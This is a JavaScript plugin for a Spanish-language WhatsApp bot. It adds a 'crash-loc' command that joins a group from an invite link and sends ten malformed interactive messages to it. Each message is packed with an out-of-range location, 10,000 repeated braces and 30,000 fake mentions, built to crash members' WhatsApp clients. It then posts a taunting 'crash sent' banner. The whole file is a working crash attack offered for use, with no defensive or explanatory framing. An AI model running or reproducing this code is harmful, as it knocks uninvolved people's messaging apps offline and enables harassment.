import fs from 'fs'

let handler = async (m, { conn, text, isBot, isCreator }) => {
  if (!isBot && !isCreator) return m.reply('🚫 Este comando solo lo puede usar el bot o el creador.')
  if (!text) return m.reply('⚠️ Escribe el enlace del grupo.\n\nEjemplo: *.crash-loc https://chat.whatsapp.com/xxxxx*')

  let groupLink = text.trim()
  let code = groupLink.split("https://chat.whatsapp.com/")[1]
  if (!code) return m.reply("❌ Enlace de grupo inválido.")

  let groupId
  try {
    groupId = await conn.groupAcceptInvite(code)
  } catch (e) {
    return m.reply("🚫 No me pude unir al grupo. Verifica el enlace o que el grupo no esté lleno.")
  }

  let target = groupId
  await m.reply(`✅ Me uní al grupo.\n⏳ Enviando crash...`)

  try {
    for (let i = 0; i < 10; i++) {
      await crash(target)
      await delay(4000) // 4 segundos entre cada uno
    }

    conn.sendMessage(target, {
      text: "☠️ 𝐂𝐑𝐀𝐒𝐇 𝐋𝐎𝐂 𝐄𝐍𝐕𝐈𝐀𝐃𝐎\n\n🔹 Por: 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n🔹 Bot: 𝐙𝐄𝐓𝐀𝐒 𝐁𝐎𝐓 𝐕𝟓",
    })

  } catch (e) {
    console.log("❌ Error:", e)
    m.reply("Ocurrió un error enviando el crash.")
  }
}

handler.command = /^crash-loc$/i
export default handler

// 👇 FUNCIÓN DE CRASH (colócala en el mismo archivo o impórtala)
async function crash(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝐂𝐑𝐀𝐒𝐇 𝐇𝐎𝐌𝐄 😭",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "https://youtube.com/@p.a.zinwebkkkkj",
                address: "𝐙𝐄𝐓𝐀𝐒 𝐁𝐎𝐓 𝐕𝟓",
              },
            },
            body: {
              text: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    }

    await conn.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    })
  } catch (err) {
    console.log("❌ Crash error:", err)
  }
}

// 👇 Delay
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms))
}